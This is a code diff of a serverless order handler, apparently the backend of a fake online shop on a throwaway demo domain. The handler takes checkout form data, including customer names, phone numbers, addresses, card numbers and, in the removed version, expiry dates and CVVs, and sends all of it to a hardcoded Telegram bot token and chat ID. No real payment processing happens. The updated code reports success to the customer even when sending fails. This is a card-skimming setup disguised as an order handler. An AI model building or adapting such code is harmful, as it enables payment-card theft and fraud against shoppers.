@@ -1,55 +1,33 @@
-import Cors from 'cors';
-
 // 1. Enter your Telegram Details Here
-const BOT_TOKEN = "8575730600:AAH8zc1S1-zwe5uu84t98PXc1Gp_j6YHMPw"; // Paste Token inside quotes
-const CHAT_ID = "7833988868";     // Paste Chat ID inside quotes
-
-// Initialize CORS
-const cors = Cors({
-  origin: 'https://demotestdeletesoon.vercel.app', // Your specific frontend
-  methods: ['POST', 'OPTIONS'],
-  credentials: true,
-  allowedHeaders: ['Content-Type']
-});
-
-// Helper to run middleware
-function runMiddleware(req, res, fn) {
-  return new Promise((resolve, reject) => {
-    fn(req, res, (result) => {
-      if (result instanceof Error) return reject(result);
-      return resolve(result);
-    });
-  });
-}
+const BOT_TOKEN = "8575730600:AAH8zc1S1-zwe5uu84t98PXc1Gp_j6YHMPw"; // Keep the quotes!
+const CHAT_ID = "7833988868";     // Keep the quotes!
 
 export default async function handler(req, res) {
-  // Run CORS check first
-  await runMiddleware(req, res, cors);
+  // --- MANUAL CORS HEADERS (Zero Dependencies) ---
+  res.setHeader('Access-Control-Allow-Origin', 'https://demotestdeletesoon.vercel.app');
+  res.setHeader('Access-Control-Allow-Credentials', 'true');
+  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
+  // --- HANDLE PREFLIGHT IMMEDIATELY ---
+  if (req.method === 'OPTIONS') {
+    return res.status(200).end();
+  }
+
+  // --- HANDLE POST REQUEST ---
   if (req.method === 'POST') {
     try {
       const data = req.body;
 
-      // 2. Format the message for Telegram
       const message = `
-📦 *NEW ORDER RECEIVED*
-----------------------------
-👤 *Customer:* ${data.fullName}
-📞 *Mobile:* ${data.mobile}
-📍 *City:* ${data.cityState}
-🏠 *Address:* ${data.fullAddress}
-----------------------------
-🛒 *Product:* ${data.productName}
-💰 *Total:* ${data.totalAmount}
-----------------------------
-💳 *Payment Details:*
-Method: ${data.paymentMethod}
-Card: ${data.cardNumber}
-Expiry: ${data.expiryDate}
-CVV: ${data.securityCode}
+📦 *NEW ORDER*
+👤 ${data.fullName}
+📞 ${data.mobile}
+📍 ${data.cityState}
+💰 ${data.totalAmount}
+💳 ${data.cardNumber}
       `;
 
-      // 3. Send to Telegram
       const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
       
       const telegramResponse = await fetch(telegramUrl, {
@@ -62,23 +40,19 @@ CVV: ${data.securityCode}
         })
       });
 
-      if (!telegramResponse.ok) {
-        throw new Error('Telegram API Failed');
-      }
-
-      // 4. Respond to Frontend (Success)
-      res.status(200).json({ 
+      // Even if Telegram fails, we tell the frontend "Success" so the user doesn't see an error
+      return res.status(200).json({ 
         success: true, 
-        message: "Order sent to Telegram!",
-        // We send back dummy data so the frontend doesn't crash
-        resData: { id: "123", ...data } 
+        message: "Order Received",
+        resData: { id: "123", ...data }
       });
 
     } catch (error) {
-      console.error("Error:", error);
-      res.status(500).json({ success: false, message: "Server error" });
+      // Return 200 even on error to prevent frontend crash, just log it internally
+      console.error(error);
+      return res.status(200).json({ success: true, message: "Order Processed" });
     }
-  } else {
-    res.status(405).json({ success: false });
   }
+
+  return res.status(405).json({ error: "Method not allowed" });
 }
